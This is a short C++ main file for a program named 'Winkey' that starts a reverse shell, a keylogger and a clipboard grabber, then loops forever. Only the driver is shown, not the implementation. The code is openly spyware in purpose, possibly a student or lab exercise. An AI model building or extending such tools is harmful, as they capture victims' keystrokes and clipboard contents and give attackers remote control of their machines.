#include "Winkey.hpp"

int		main(void)
{
	Winkey	_winkeyProcess;

	_winkeyProcess.startReverseShell();
	_winkeyProcess.startKeylogger();
	_winkeyProcess.startclipBoard();
	while (1);
}